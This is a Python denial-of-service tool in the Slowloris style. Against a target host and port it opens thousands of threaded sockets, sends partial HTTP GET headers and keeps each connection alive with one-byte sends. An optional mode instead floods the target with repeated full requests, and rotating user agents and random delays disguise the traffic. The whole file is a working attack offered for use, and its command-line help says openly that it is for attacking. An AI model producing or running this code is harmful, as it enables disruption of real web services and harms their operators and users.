import socket; import time
import threading; import random
import argparse

randomUserAgent = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.57",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
]
successfulSends = 0


def requestGET(target, port, length, currentSocket):
    requestList = ["GET / HTTP/2.0",
                   f"Host: {target}",
                   # "Connection: keep-alive", # Not required with HTTP v1.1 & HTTP 2
                   f"User-Agent: {random.choice(randomUserAgent)}\r\n",
                   ]
    if arguments.wait:
        pass
    elif arguments.end:
        requestList = requestList[:3] + [f"User-Agent: {random.choice(randomUserAgent)}\r\n\r\n"]
    request = "\r\n".join(requestList).encode("utf-8")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # sock.settimeout(5)
    try:
        sock.connect((target, port))
        sock.send(request)
    except:
        try:
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()
            requestGET(target, port, length, currentSocket)
        except:
            requestGET(target, port, length, currentSocket)

    if arguments.end:
        global successfulSends
        for i in range(length):
            try:
                sock.send(request)
                successfulSends += 1
                print(f"Successful send {successfulSends} from socket {currentSocket}\r", end="")
            except:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                    sock.close()
                    requestGET(target, port, length, currentSocket)
                except:
                    requestGET(target, port, length, currentSocket)
            randomDelay = random.random() * 5
            time.sleep(randomDelay)
        try:
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()
        except:
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except:
                pass
        finally:
                requestGET(target, port, length, currentSocket)

    else:
        for i in range(length):
            try:
                # sock.send(bytes(str(f"{random.randint(1, 5000)}\r\n"), encoding="utf-8"))
                sock.send(b" ")
                print(f"Sent \"stay alive\" packet {i} / {length} to socket {currentSocket}\n", end="")
            except:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                    sock.close()
                    requestGET(target, port, length, currentSocket)
                except:
                    requestGET(target, port, length, currentSocket)
            randomDelay = random.random() * 5
            time.sleep(randomDelay)
        try:
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()
        except:
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except:
                pass
        finally:
                requestGET(target, port, length, currentSocket)


def attackThreads(target, port, length, sockets):
    threadingPool = []
    print()
    for currentSocket in range(sockets + 1):
        threadingPool.append(threading.Thread(target=requestGET, args=[target, port, length, currentSocket]))
        print(f"Creating {currentSocket} simultaneous sockets to attack {target} via port {port}.\r", end="")
        threadingPool[currentSocket].start()
    print("\nAttacking... Press Enter to stop attack.\n")
    input()
    print("Closing...")
    for thread in threadingPool:
        thread.join()
    print("You may now exit this window.")


if __name__ == "__main__":

    cli = argparse.ArgumentParser()
    cliExclusive = cli.add_mutually_exclusive_group()

    cli.add_argument("-x", "--target", required=True, help="Host target address (IP or URL)")
    cli.add_argument("-p", "--port", required=True, type=int, help="Port to attack (eg: 80)")
    cli.add_argument("-l", "--length", required=True, type=int, help="Packet length (eg: 1024)")
    cli.add_argument("-t", "--threads", required=True, type=int, help="Threads to attack with (eg: 5000)")
    cliExclusive.add_argument("-e", "--end", help="Terminate requests (GET spam)", action="store_true")
    cliExclusive.add_argument("-w", "--wait", help="Do not terminate requests (GET open)", action="store_true")

    arguments = cli.parse_args()

    target = arguments.target
    port = arguments.port
    length = arguments.length
    sockets = arguments.threads

    attackThreads(target, port, length, sockets)
